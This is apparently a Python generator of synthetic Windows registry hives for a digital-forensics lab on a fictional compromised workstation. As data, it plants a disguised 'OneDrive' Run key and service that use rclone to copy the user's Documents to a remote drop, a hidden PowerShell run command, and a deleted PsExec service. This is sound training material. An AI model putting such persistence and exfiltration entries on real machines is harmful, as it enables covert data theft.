#!/usr/bin/env python3
"""mk_reg_hives.py - build small, valid Windows registry hives (regf) for the Day 11 lab.

Usage: python3 mk_reg_hives.py OUTDIR

Writes SYSTEM, SOFTWARE and NTUSER.DAT for the fictional workstation WS-ALICE (the same story as
Days 9 and 10). Every key gets a chosen last-write time, the output is byte-identical on every run,
and two things were "deleted" the way Windows deletes them: the cells are marked free and unlinked
from their parent, but their bytes stay in the hive:
  SYSTEM      ControlSet001\\Services\\PSEXESVC     (a PsExec service key, deleted 2026-09-29 01:06:40)
  NTUSER.DAT  ...\\Explorer\\RunMRU value "b"        (a Run-dialog command, removed from the MRU)

The hives are clean (primary and secondary sequence numbers match); use real dirty hives with their
.LOG1/.LOG2 files to study transaction logs. Standard library only.
"""
import calendar
import os
import struct
import sys

REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_MULTI_SZ, REG_QWORD = 1, 2, 3, 4, 7, 11


def ft(text):
    """'2026-09-29 01:22:10.5550001' (UTC) -> FILETIME."""
    date, _, frac = text.partition(".")
    secs = calendar.timegm(tuple(int(x) for x in date.replace("-", " ").replace(":", " ").split()) + (0, 0, 0))
    return (secs + 11644473600) * 10_000_000 + int((frac or "0").ljust(7, "0"))


def sz(s):
    return (s + "\0").encode("utf-16-le")


def multi_sz(items):
    return ("\0".join(items) + "\0\0").encode("utf-16-le")


class Key:
    def __init__(self, name, when, values=(), deleted=False):
        self.name, self.when, self.deleted = name, ft(when), deleted
        self.values = list(values)          # (name, type, bytes, deleted?)
        self.children = []


def sid_bytes(sid):
    parts = sid.split("-")
    rev, auth, subs = int(parts[1]), int(parts[2]), [int(x) for x in parts[3:]]
    return struct.pack("<BB", rev, len(subs)) + auth.to_bytes(6, "big") + b"".join(struct.pack("<I", s) for s in subs)


def security_descriptor():
    """Self-relative SD: owner Administrators, group SYSTEM, DACL: SYSTEM full control, Everyone read."""
    def ace(mask, sid):
        body = struct.pack("<I", mask) + sid_bytes(sid)
        return struct.pack("<BBH", 0, 0x02, 4 + len(body)) + body
    aces = ace(0x000F003F, "S-1-5-18") + ace(0x00020019, "S-1-1-0")
    acl = struct.pack("<BBHHH", 2, 0, 8 + len(aces), 2, 0) + aces
    owner, group = sid_bytes("S-1-5-32-544"), sid_bytes("S-1-5-18")
    o_owner = 20
    o_group = o_owner + len(owner)
    o_dacl = o_group + len(group)
    return struct.pack("<BBHIIII", 1, 0, 0x8004, o_owner, o_group, 0, o_dacl) + owner + group + acl


def lh_hash(name):
    h = 0
    for c in name.upper():
        h = (h * 37 + ord(c)) & 0xFFFFFFFF
    return h


class Hive:
    """Lays cells out one after another in a single growing area, then splits it into 4 KB hbins."""

    def __init__(self):
        self.buf = bytearray()

    def cell(self, data, free=False):
        size = (4 + len(data) + 7) & ~7
        off = len(self.buf)
        self.buf += struct.pack("<i", size if free else -size) + data + b"\0" * (size - 4 - len(data))
        return off

    def patch(self, off, fmt, value):
        struct.pack_into(fmt, self.buf, off + 4, value)


def build(root, file_name, last_written):
    hv = Hive()
    sd = security_descriptor()
    sk_off = hv.cell(b"sk" + b"\0\0" + struct.pack("<IIII", 0, 0, 0, len(sd)) + sd)
    hv.patch(sk_off, "<I", sk_off)      # flink -> itself
    struct.pack_into("<I", hv.buf, sk_off + 4 + 8, sk_off)  # blink -> itself
    keys = []

    def write_key(key, parent_off, is_root=False):
        name = key.name.encode("ascii")
        live_kids = [k for k in key.children if not k.deleted]
        live_vals = [v for v in key.values if not (len(v) > 3 and v[3])]
        flags = 0x20 | (0x0C if is_root else 0)  # KEY_COMP_NAME (+ HIVE_ENTRY | NO_DELETE for the root)
        nk = bytearray(b"nk" + struct.pack("<HQIIIIIIIIIIIIIIIHH", flags, key.when, 0, parent_off,
                                            len(live_kids), 0, 0xFFFFFFFF, 0xFFFFFFFF,
                                            0 if key.deleted else len(live_vals), 0xFFFFFFFF, sk_off, 0xFFFFFFFF,
                                            max([len(k.name) * 2 for k in live_kids] or [0]), 0,
                                            max([len(v[0]) * 2 for v in live_vals] or [0]),
                                            max([len(v[2]) for v in live_vals] or [0]), 0, len(name), 0) + name)
        off = hv.cell(bytes(nk), free=key.deleted)
        keys.append(key)
        # values. A deleted value (or every value of a deleted key) is written as free cells. As in
        # Windows, the old value list survives as a free cell that still points at every value, and
        # a deleted key keeps its own value count and value list offset.
        vk_all, vk_live = [], []
        for v in key.values:
            vname, vtype, data = v[0], v[1], v[2]
            vdel = key.deleted or (len(v) > 3 and v[3])
            if len(data) <= 4:
                dsize, doff = len(data) | 0x80000000, int.from_bytes(data.ljust(4, b"\0"), "little")
            else:
                dsize, doff = len(data), hv.cell(data, free=vdel)
            vn = vname.encode("ascii")
            vk = hv.cell(b"vk" + struct.pack("<HIIIHH", len(vn), dsize, doff, vtype, 1 if vn else 0, 0) + vn, free=vdel)
            vk_all.append(vk)
            if not vdel:
                vk_live.append(vk)
        if key.deleted and vk_all:
            vl = hv.cell(b"".join(struct.pack("<I", o) for o in vk_all), free=True)
            struct.pack_into("<II", hv.buf, off + 4 + 0x24, len(vk_all), vl)
        elif vk_live:
            if len(vk_live) < len(vk_all):
                hv.cell(b"".join(struct.pack("<I", o) for o in vk_all), free=True)  # the old, longer list
            vl = hv.cell(b"".join(struct.pack("<I", o) for o in vk_live))
            struct.pack_into("<I", hv.buf, off + 4 + 0x28, vl)
        # subkeys, sorted the way Windows sorts them (case-insensitive)
        kid_offs = [(k, write_key(k, off)) for k in sorted(key.children, key=lambda k: k.name.upper())]
        live = [(k, o) for k, o in kid_offs if not k.deleted]
        if live:
            lh = hv.cell(b"lh" + struct.pack("<H", len(live)) +
                         b"".join(struct.pack("<II", o, lh_hash(k.name)) for k, o in live))
            struct.pack_into("<I", hv.buf, off + 4 + 0x1C, lh)
        return off

    root_off = write_key(root, 0xFFFFFFFF, is_root=True)
    refs = sum(1 for k in keys if not k.deleted)
    struct.pack_into("<I", hv.buf, sk_off + 4 + 12, refs)

    # split into hbins: a cell must not cross a 4 KB hbin boundary, so re-pack cell by cell
    cells, pos = [], 0
    while pos < len(hv.buf):
        size = abs(struct.unpack_from("<i", hv.buf, pos)[0])
        cells.append((pos, hv.buf[pos:pos + size]))
        pos += size
    out, relocation, bins = bytearray(), {}, []
    cur = bytearray()

    def close_bin():
        nonlocal cur
        if not cur:
            return
        room = 4096 - 0x20 - len(cur)
        if room:
            cur += struct.pack("<i", room) + b"\0" * (room - 4)   # free cell fills the rest of the bin
        bins.append(b"\0" * 0x20 + cur)                           # 0x20-byte hbin header, filled in below
        cur = bytearray()

    for old, raw in cells:
        if 0x20 + len(cur) + len(raw) > 4096:  # cells are multiples of 8, so any leftover is >= 8 bytes
            close_bin()
        relocation[old] = len(bins) * 4096 + 0x20 + len(cur)
        cur += raw
    close_bin()
    data = bytearray(b"".join(bins))

    def fix(off, fieldpos):
        v = struct.unpack_from("<I", data, off + fieldpos)[0]
        if v != 0xFFFFFFFF and v in relocation:
            struct.pack_into("<I", data, off + fieldpos, relocation[v])

    for old, raw in cells:
        new = relocation[old]
        sig = bytes(raw[4:6])
        if sig == b"nk":
            for f in (4 + 0x10, 4 + 0x1C, 4 + 0x28, 4 + 0x2C):
                fix(new, f)
        elif sig == b"sk":
            fix(new, 4 + 4)
            fix(new, 4 + 8)
        elif sig == b"vk":
            dsize = struct.unpack_from("<I", data, new + 4 + 4)[0]
            if not dsize & 0x80000000:
                fix(new, 4 + 8)
        elif sig == b"lh":
            n = struct.unpack_from("<H", data, new + 6)[0]
            for i in range(n):
                fix(new, 8 + 8 * i)
    vk_cells = {old for old, raw in cells if bytes(raw[4:6]) == b"vk"}
    for old, raw in cells:  # value lists have no signature: any cell made only of vk offsets is one
        body = raw[4:]
        n = len(body) // 4
        ptrs = [struct.unpack_from("<I", body, 4 * i)[0] for i in range(n)]
        live = [p for p in ptrs if p]
        if live and bytes(raw[4:6]) not in (b"nk", b"vk", b"sk", b"lh") and all(p in vk_cells for p in live):
            for i, p in enumerate(ptrs):
                if p:
                    fix(relocation[old], 4 + 4 * i)
    for i, b in enumerate(bins):  # hbin headers
        hdr = b"hbin" + struct.pack("<III", i * 4096, 4096, 0) + struct.pack("<I", 0) + \
            struct.pack("<Q", last_written if i == 0 else 0) + struct.pack("<I", 0)
        data[i * 4096:i * 4096 + 0x20] = hdr[:0x20]

    base = bytearray(4096)
    struct.pack_into("<4sIIQIIIIIII", base, 0, b"regf", 1, 1, last_written, 1, 5, 0, 1,
                     relocation[root_off], len(data), 1)
    fname = file_name[-31:].encode("utf-16-le")  # Windows keeps the last 31 characters of the path
    base[0x30:0x30 + len(fname)] = fname
    csum = 0
    for i in range(127):
        csum ^= struct.unpack_from("<I", base, i * 4)[0]
    csum = {0: 1, 0xFFFFFFFF: 0xFFFFFFFE}.get(csum, csum)
    struct.pack_into("<I", base, 0x1FC, csum)
    return bytes(base) + bytes(data)


def K(name, when, values=(), children=(), deleted=False):
    k = Key(name, when, values, deleted)
    k.children = list(children)
    return k


INSTALL = "2026-03-02 09:00:00.1234567"


def system_hive():
    filetime = struct.pack("<Q", ft("2026-09-28 18:02:44.6620193"))
    svc = lambda name, when, path, start, display, deleted=False: K(name, when, [  # noqa: E731
        ("Type", REG_DWORD, struct.pack("<I", 0x10)), ("Start", REG_DWORD, struct.pack("<I", start)),
        ("ErrorControl", REG_DWORD, struct.pack("<I", 1)), ("ImagePath", REG_EXPAND_SZ, sz(path)),
        ("DisplayName", REG_SZ, sz(display)), ("ObjectName", REG_SZ, sz("LocalSystem"))], deleted=deleted)
    tz = [("Bias", REG_DWORD, struct.pack("<i", -60)), ("ActiveTimeBias", REG_DWORD, struct.pack("<i", -120)),
          ("StandardName", REG_SZ, sz("@tzres.dll,-321")), ("DaylightName", REG_SZ, sz("@tzres.dll,-322")),
          ("TimeZoneKeyName", REG_SZ, sz("W. Europe Standard Time"))]
    cs = K("ControlSet001", INSTALL, children=[
        K("Control", "2026-09-28 18:02:44.6620193", children=[
            K("ComputerName", INSTALL, children=[
                K("ComputerName", INSTALL, [("ComputerName", REG_SZ, sz("WS-ALICE"))])]),
            K("TimeZoneInformation", INSTALL, tz),
            K("Windows", "2026-09-28 18:02:44.6620193", [("ShutdownTime", REG_BINARY, filetime)])]),
        K("Services", "2026-09-29 01:22:10.5550001", children=[
            svc("W32Time", INSTALL, r"%SystemRoot%\system32\svchost.exe -k LocalService", 3, "Windows Time"),
            svc("PSEXESVC", "2026-09-29 01:05:12.0731180", r"%SystemRoot%\PSEXESVC.exe", 3, "PSEXESVC", deleted=True),
            svc("OneDriveSync", "2026-09-29 01:22:10.5550001",
                r"C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop",
                2, "OneDrive Sync Helper")])])
    sel = K("Select", INSTALL, [(n, REG_DWORD, struct.pack("<I", v))
                                for n, v in (("Current", 1), ("Default", 1), ("Failed", 0), ("LastKnownGood", 1))])
    return K("ROOT", "2026-09-29 01:22:10.5550001", children=[cs, sel])


def software_hive():
    sid = "S-1-5-21-3623811015-3361044348-30300820"
    cv = [("ProductName", REG_SZ, sz("Windows 10 Pro")), ("DisplayVersion", REG_SZ, sz("24H2")),
          ("CurrentBuild", REG_SZ, sz("26100")), ("EditionID", REG_SZ, sz("Professional")),
          ("RegisteredOwner", REG_SZ, sz("alice")), ("InstallDate", REG_DWORD, struct.pack("<I", 1772442000)),
          ("InstallTime", REG_QWORD, struct.pack("<Q", ft(INSTALL)))]
    profiles = K("ProfileList", "2026-03-04 14:30:02.9310055", children=[
        K(f"{sid}-1001", INSTALL, [("ProfileImagePath", REG_EXPAND_SZ, sz(r"C:\Users\alice"))]),
        K(f"{sid}-1002", "2026-03-04 14:30:02.9310055", [("ProfileImagePath", REG_EXPAND_SZ, sz(r"C:\Users\bob"))])])
    run = K("Run", INSTALL, [("SecurityHealth", REG_EXPAND_SZ, sz(r"%windir%\system32\SecurityHealthSystray.exe"))])
    return K("ROOT", "2026-03-04 14:30:02.9310055", children=[K("Microsoft", INSTALL, children=[
        K("Windows NT", INSTALL, children=[K("CurrentVersion", "2026-03-04 14:30:02.9310055", cv, [profiles])]),
        K("Windows", INSTALL, children=[K("CurrentVersion", INSTALL, children=[run])])])])


def ntuser_hive():
    explorer = K("Explorer", "2026-09-29 01:09:31.4420917", children=[
        K("RunMRU", "2026-09-29 01:09:31.4420917", [
            ("a", REG_SZ, sz("powershell -w hidden -nop\\1")),
            ("b", REG_SZ, sz("cmd /c rclone config\\1"), True),          # deleted value
            ("MRUList", REG_SZ, sz("a"))]),
        K("TypedPaths", "2026-09-29 01:04:55.8761203", [
            ("url1", REG_SZ, sz(r"\\203.0.113.50\drop")),
            ("url2", REG_SZ, sz(r"C:\Users\alice\AppData\Local\Temp\rc"))])])
    run = K("Run", "2026-09-29 01:21:30.0187744", [
        ("OneDrive", REG_SZ, sz(r'"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background')),
        ("OneDriveUpdate", REG_SZ, sz(r"C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop"))])
    env = K("Environment", INSTALL, [("TEMP", REG_EXPAND_SZ, sz(r"%USERPROFILE%\AppData\Local\Temp"))])
    return K("ROOT", "2026-09-29 01:21:30.0187744", children=[env, K("Software", INSTALL, children=[
        K("Microsoft", INSTALL, children=[K("Windows", INSTALL, children=[
            K("CurrentVersion", "2026-09-29 01:21:30.0187744", children=[explorer, run])])])])])


def main(outdir):
    os.makedirs(outdir, exist_ok=True)
    for fname, root, internal, when in (
            ("SYSTEM", system_hive(), r"\SystemRoot\System32\Config\SYSTEM", "2026-09-29 01:22:10.5550001"),
            ("SOFTWARE", software_hive(), r"\SystemRoot\System32\Config\SOFTWARE", "2026-03-04 14:30:02.9310055"),
            ("NTUSER.DAT", ntuser_hive(), r"\??\C:\Users\alice\ntuser.dat", "2026-09-29 01:21:30.0187744")):
        data = build(root, internal, ft(when))
        with open(os.path.join(outdir, fname), "wb") as f:
            f.write(data)
        print(f"{len(data):>7}  {fname}")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "hives")
